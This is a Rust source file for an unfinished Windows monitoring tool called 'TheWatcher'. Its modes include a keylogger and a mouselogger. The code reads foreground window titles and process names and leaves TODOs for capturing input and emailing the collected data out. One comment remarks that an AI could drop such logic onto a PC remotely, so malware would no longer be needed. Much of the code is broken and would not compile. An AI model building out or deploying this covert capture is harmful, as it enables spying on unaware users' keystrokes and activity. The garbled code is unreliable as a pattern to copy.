use anyhow::Result;

use tokio::io::*;
use std::{error::Error, fs::File};
use std::io::prelude::*;
use windows::{
    core::*, 
    Data::Xml::Dom::*,
    Win32::Foundation::*,
    Win32::System::Threading::*,
    Win32::UI::WindowsAndMessaging::*,
};

#[allow(non_camel_case_types)]
pub enum LoggingOptions {
    // <Windows tail title>: receiver IP / DNS address
    NETWORK_ACTIVITY_MODE,
    // keylogger
    KEYBOARD_ONLY,
    // mouselogger
    MOUSE_ONLY,
    // All with multi-threading
    ALL,
}

pub struct TheWatcher {
    pid: u32,                           // type.c_ulong
    logging_flag: bool,
    output_path: &'static str,
    csv_option: bool,
    option: LoggingOptions,
    target: (String, String),
    buffered_data: BufferedData,
    // data_bus_stream: Someting,
}

struct BufferedData {
    // date: Date
    data: Vec<usize>,
    // sender_email: &' static str
}
impl BufferedData {
    pub fn new() -> Self {
        let data: Vec<usize> = Vec::new();
        Self { data }
    }
    pub fn from(buffered_data: &BufferedData, _data: Vec<usize>) -> Self {
        let mut data= buffered_data.data.clone();
        data.extend(_data);
        
        Self { data }
    }
    pub fn unwrap_data(self) -> Vec<usize> {
        self.data
    }
}

impl TheWatcher {
    pub fn new(pid: u32, output_path: &'static str) -> Self {
        let logging_flag = true;
        let csv_option = false;
        let option = LoggingOptions::ALL;
        let target= (String::new(), String::new());
        // let data_bus_stream= something;

        let buffered_data = BufferedData::new();

        Self {
            pid,
            logging_flag,
            output_path,
            csv_option,
            option,
            buffered_data,
            target,
            // data_bus_stream,
        } 
    }

    // unit test done - fn get_name_process
    unsafe fn get_name_process(pid: u32)-> windows::core::Result<String>{ 
        let handle= OpenProcess(
            PROCESS_QUERY_LIMITED_INFORMATION,
            false,
            pid
        )?;

        // dead code: let title_len= windows::Wind32::UI::WindowsAndMessaging::GetWindowTextLengthW(hwnd)
        const BUFFER_MAX_SIZE: usize= 2028;
        let mut buffer= [0u16; BUFFER_MAX_SIZE];
        let mut buffer_size= buffer.len() as u32;

        QueryFullProcessImageNameW(
            handle,
            Threading::PROCESS_NAME_WIN32,
            PWSTR(buffer.as_mut_ptr()),
            &mut buffer_size
        )?;

        Ok(String::from_utf16_lossy(&buffer[..size as usize]))
    }
    fn filter_absolut_path(raw_path: String) -> (String, String) {
        let v_strs: Vec<&str>= raw_path[..aw_path+1].split(r#"\\"#).collect();

        let exe_name= v_strs.pop_up();
        let program_name= v_strs.pop_up();

        (program_name.to_string(), exe_name.to_string())
    }
    pub fn setting_target(&mut self) -> &mut Self {
        // If AI can drop some codes like this logic,
        //  malware do not need anymore :)
        //  just conect PC, and then drop that code remotely.
        cfg_select! {
            windows => {
                let mut string_target_path= (String::new(), String::new();
                unsafe{
                    string_target_path= match get_name_process(){
                        Ok(_string) => { return _string },
                        Err(e) => { return "".to_string() };
                    };
                };
                self.target= filter_absolut_path(get_name_process);
            },
            _ => {
                // @TODO hook a daemon
            }
        };

        // hook a target
        // self.target= SomeTool::hook(pid);
        // self.data_bus_steam= something;

        self
    }

    async fn read_data_stream(data_bus_stream: stream) -> Result<Vec<usize>, Box<dyn Error>> {
        static CAPACITY_LINE: usize= 1024000000;
        let mut unwrapped_data: Vec<usize> = Vec::with_capacity(CAPACITY_LINE);

        // !TODO if returned err, try to reconn
        loop{
            let mut buffer_result: Vec<usize> = Vec::new();
            
            // @TODO https://docs.rs/tokio/latest/tokio/io/trait.AsyncRead.html
            let pointer: core::task::Pin<&mut Self>;
            buffer_result = AsyncRead::poll_read(
                pointer,
                data_bus_stream,
                buffer_result,
            )?;

            // !TODO define buffer_result max size 1024000000 ~ +5000000)
            match buffer_result {
                Ok(data) => {
                    unwrapped_data= data;
                    break;
                }
                Err(e) => {
                    return Err("can't get data bus stream".into());
                }
            }
        }
        
        if unwrapped_data.capacity() >= CAPACITY_LINE {
            return Ok(unwrapped_data);
        } else if unwrapped_data.is_empty(){
            return Err("No data collected".into());
        }

        Ok(unwrapped_data)
    }

    fn filtering_data(_stream_data: Vec<usize>) -> String {
        let mut filtered_string = "".to_string();

        filtered_string
    }

    // title name supporte English, Japanese, and so on (unicode)
    // unit test done - fn get_current_windows_title_name()
    unsafe fn get_current_windows_title_name()-> String{ 
        let mut reulst_title_string= String::new();
        
        unsafe{
            let mut hwnd= GetForegroundWindow();
            if hwnd.is_invalid(){
                eprint!("can't get hwnd");
            }else{
                hwnd= hwnd.clone();
            }
        
            let mut ipdw_process_id: u32= 111_u32; // just for fill parameter
            let targeted_process= GetWindowThreadProcessId(
                hwnd,
                Option::Some(&mut ipdw_process_id) 
            );
    
    
        
            // let title_len= windows::Win32::UI::WindowsAndMessaging::GetWindowTextLengthW(hwnd);
            let mut str_buffer= [0u16; 1024 as usize];
            let actual_len= GetWindowTextW(
                hwnd,
                &mut str_buffer,
                // str_buffer.len() as i32
            );
        
            // Gemini mentioned "Preventing Ghost Windows"
            if actual_len != 0{
                reulst_title_string= String::from_utf16_lossy(&str_buffer[..actual_len as usize]);
            }
        };
        reulst_title_string
    } 
    pub async fn logging(&mut self, flag: bool, option: LoggingOptions) -> &mut Self {
        self.logging_flag = flag;
        self.option = option;

        // @TODO
        // If this program save a data as file automatically,
        // i can write my code more consistently(buffer clean, and then keep watching again).
        // But its not a malware. Just in educational purpose.
        let pid= self.pid.clone();
        let v_titles= get_title(pid);
        
        // logging
        let stream_data = read_data_stream(self.data_bus_stream);
        // @TODO unwrap data

        let buffered_data= &self.buffered_data;
        self.buffered_data = BufferedData::from(buffered_data, stream_data);
        
        self
    }

    pub fn output_txt_path(&mut self, flag: bool) -> Result<&mut Self> {
        let path = &self.output_path;
        let full_path = format!("{}/output.txt", path);

        match flag {
            true => {
                let mut file = File::create(full_path)?;

                let unwrapped_data = BufferedData::unwrap_data(self.buffered_data);
                let filtered_data = filtering_data(unwrapped_data);

                file.write_all(filtered_data.as_bytes())?;
            }
            false => {
                // @TODO send data to sender as email
            }
        }
        Ok(self)
    }

    pub fn csv_format_option(&mut self, flag: bool) -> Result<&mut Self> {
        Ok(self)
    }
}
